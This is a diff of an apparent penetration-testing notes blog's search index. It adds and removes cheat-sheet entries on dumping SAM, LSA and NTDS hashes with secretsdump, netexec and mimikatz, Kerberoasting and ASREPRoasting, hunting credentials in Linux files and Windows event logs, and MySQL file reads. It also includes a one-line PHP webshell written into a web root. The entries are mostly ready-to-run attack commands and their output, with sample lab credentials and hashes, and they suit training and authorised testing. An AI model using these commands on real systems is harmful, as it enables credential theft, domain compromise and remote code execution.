+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
+<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Privesc</category>
+        <category>Groups</category>
+      </categories>
+      <tags>
+        <tag>wevtutil</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-SAM</tag>
       </tags>
   </entry>
   <entry>
@@ -943,6 +1048,79 @@
         <category>Privesc</category>
         <category>Groups</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Kerberoasting &amp; ASREPRoasting</title>
+    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
+    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
+
+<p>GetNPUsers</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
+<p>Requesting TGS Ticket For Specific Account : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Requesting all TGS Tickets : </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Cracking Ticket Offline</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Kerberoasting &amp; ASREPRoasting</category>
+      </categories>
+      <tags>
+        <tag>impacket-GetNPUsers</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux Credential Hunting</title>
+    <url>/2025/11/27/Linux-Credential-Hunting/</url>
+    <content><![CDATA[<h1 id="Linux-Credential-Hunting"><a href="#Linux-Credential-Hunting" class="headerlink" title="Linux Credential Hunting"></a>Linux Credential Hunting</h1><h3 id="Enumerating-history-files"><a href="#Enumerating-history-files" class="headerlink" title="Enumerating history files"></a>Enumerating history files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n10 /home/*/.bash*</span><br></pre></td></tr></table></figure>
+
+<h3 id="Searching-for-configuration-files"><a href="#Searching-for-configuration-files" class="headerlink" title="Searching for configuration files"></a>Searching for configuration files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.conf .config .cnf&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;lib\|fonts\|share\|core&quot;</span> ;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Searching-for-Passwords-in-Configuration-Files"><a href="#Searching-for-Passwords-in-Configuration-Files" class="headerlink" title="Searching for Passwords in Configuration Files"></a>Searching for Passwords in Configuration Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find / -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.txt&quot;</span> -o -iname <span class="string">&quot;*.ini&quot;</span> -o -iname <span class="string">&quot;*.cfg&quot;</span> -o -iname <span class="string">&quot;*.config&quot;</span> -o -iname <span class="string">&quot;*.xml&quot;</span> -o -iname <span class="string">&quot;*.yml&quot;</span> -o -iname <span class="string">&quot;*.yaml&quot;</span> -o -iname <span class="string">&quot;*.cnf&quot;</span> -o -iname <span class="string">&quot;*.conf&quot;</span> -o -iname <span class="string">&quot;*.sh&quot;</span> -o -iname <span class="string">&quot;*.py&quot;</span> -o -iname <span class="string">&quot;*.php&quot;</span> -o -iname <span class="string">&quot;*.git&quot;</span> -o -iname <span class="string">&quot;*.json&quot;</span> \) 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib&quot;</span>); <span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile: <span class="variable">$i</span>&quot;</span>; grep -Ei <span class="string">&quot;password|passphrase|key|username|user account|creds|users|passkeys|configuration|dbcredential|dbpassword|pwd|login|credentials&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> 2&gt;/dev/null | grep -Ev <span class="string">&quot;^\s*#&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-databases"><a href="#Searching-for-databases" class="headerlink" title="Searching for databases"></a>Searching for databases</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.sql .db .*db .db*&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nDB File extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share\|man&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-scripts"><a href="#Searching-for-scripts" class="headerlink" title="Searching for scripts"></a>Searching for scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> $(<span class="built_in">echo</span> <span class="string">&quot;.py .pyc .pl .go .jar .c .sh&quot;</span>);<span class="keyword">do</span> <span class="built_in">echo</span> -e <span class="string">&quot;\nFile extension: &quot;</span> <span class="variable">$l</span>; find / -name *<span class="variable">$l</span> 2&gt;/dev/null | grep -v <span class="string">&quot;doc\|lib\|headers\|share&quot;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Searching-for-notes"><a href="#Searching-for-notes" class="headerlink" title="Searching for notes"></a>Searching for notes</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /home/* -<span class="built_in">type</span> f -name <span class="string">&quot;*.txt&quot;</span> -o ! -name <span class="string">&quot;*.*&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Enumerating-log-files"><a href="#Enumerating-log-files" class="headerlink" title="Enumerating log files"></a>Enumerating log files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span> /var/log/* 2&gt;/dev/null);<span class="keyword">do</span> GREP=$(grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null); <span class="keyword">if</span> [[ <span class="variable">$GREP</span> ]];<span class="keyword">then</span> <span class="built_in">echo</span> -e <span class="string">&quot;\n#### Log file: &quot;</span> <span class="variable">$i</span>; grep <span class="string">&quot;accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs&quot;</span> <span class="variable">$i</span> 2&gt;/dev/null;<span class="keyword">fi</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumerating-cronjobs"><a href="#Enumerating-cronjobs" class="headerlink" title="Enumerating cronjobs"></a>Enumerating cronjobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron.*/</span><br><span class="line"></span><br><span class="line">/etc/cron.d/:</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root root  106  3. Jan 20:27 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all</span><br><span class="line">-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate</span><br><span class="line">-rw-r--r-- 1 root root  607 25. Jan 2021  john</span><br><span class="line">-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm</span><br><span class="line">-rw-r--r-- 1 root root  712 11. Mai 2020  php</span><br><span class="line">-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder</span><br><span class="line">-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/:</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 1 root root  252  6. Jan 16:24 .</span><br><span class="line">drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>config-files</tag>
+        <tag>history-file</tag>
+        <tag>db-files</tag>
+        <tag>cronjobs-enumeration</tag>
+      </tags>
   </entry>
   <entry>
     <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
@@ -1178,43 +1356,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Dump NTDS</title>
-    <url>/2025/11/26/Dump-NTDS/</url>
-    <content><![CDATA[<p>➜ Required privilege </p>
-<ul>
-<li><p><code>Member of Domain Admins (DA)</code></p>
-</li>
-<li><p><code>Member of Enterprise Admins (EA)</code></p>
-</li>
-<li><p><code>Member of local Administrators group on the DC</code></p>
-</li>
-<li><p><code>Backup Operators ( SeBackupPrivilege )</code></p>
-</li>
-</ul>
-<h1 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h1><h3 id="Creating-shadow-copy-of-C"><a href="#Creating-shadow-copy-of-C" class="headerlink" title="Creating shadow copy of C:"></a>Creating shadow copy of C:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy <span class="keyword">for</span> <span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">    Shadow Copy ID: &#123;186d5979-2f2b-4afe-8101-9f1111e4cb1a&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>
-
-<h3 id="Copying-NTDS-dit-from-the-VSS"><a href="#Copying-NTDS-dit-from-the-VSS" class="headerlink" title="Copying NTDS.dit from the VSS"></a>Copying NTDS.dit from the VSS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>➜ Since the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>, we need to transfer the <code>SYSTEM</code> registry with <code>NTDS.dit</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h1><h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</span><br><span class="line"></span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-NTDS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL Enumeration</title>
     <url>/2025/11/21/MySQL-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
@@ -1253,6 +1394,46 @@
       <tags>
         <tag>Enumeration</tag>
         <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -1329,108 +1510,6 @@
         <tag>klist</tag>
         <tag>kinit</tag>
         <tag>KeyTabExtract</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Event Log Readers</title>
-    <url>/2026/03/06/Event-Log-Readers/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
-</blockquote>
-<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
-<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; wevtutil qe Security /<span class="built_in">rd</span>:true /f:text | <span class="built_in">Select-String</span> <span class="string">&quot;/user&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">Process</span> Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">        <span class="keyword">Process</span> Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Searching-Security-Logs-with-Get-WinEvent"><a href="#Searching-Security-Logs-with-Get-WinEvent" class="headerlink" title="Searching Security Logs with Get-WinEvent"></a>Searching Security Logs with <code>Get-WinEvent</code></h4><blockquote>
-<p>➜ Process creation events are recorded under <code>Event ID 4688 (A new process has been created)</code>. Filtering for this event ID can help identify commands that include user credentials.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\logger&gt; <span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> security | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="number">4688</span> <span class="operator">-and</span> <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value <span class="operator">-like</span> <span class="string">&#x27;*/user*&#x27;</span>&#125;</span><br><span class="line"> | <span class="built_in">Select-Object</span> <span class="selector-tag">@</span>&#123;name=<span class="string">&#x27;CommandLine&#x27;</span>;expression=&#123; <span class="variable">$_</span>.Properties[<span class="number">8</span>].Value &#125;&#125;</span><br><span class="line"></span><br><span class="line">CommandLine</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!</span><br><span class="line">net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!</span><br><span class="line">net  use T: \\fs01\backups /user:tim MyStr0P@sword</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Privesc</category>
-        <category>Groups</category>
-      </categories>
-      <tags>
-        <tag>wevtutil</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kerberoasting &amp; ASREPRoasting</title>
-    <url>/2026/01/06/Kerberoasting-ASREPRoasting/</url>
-    <content><![CDATA[<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p>kerbrute</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br></pre></td></tr></table></figure>
-
-<p>GetNPUsers</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Cracking Ticket Offline</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><blockquote>
-<p>Requesting TGS Ticket For Specific Account : </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Requesting all TGS Tickets : </p>
-</blockquote>
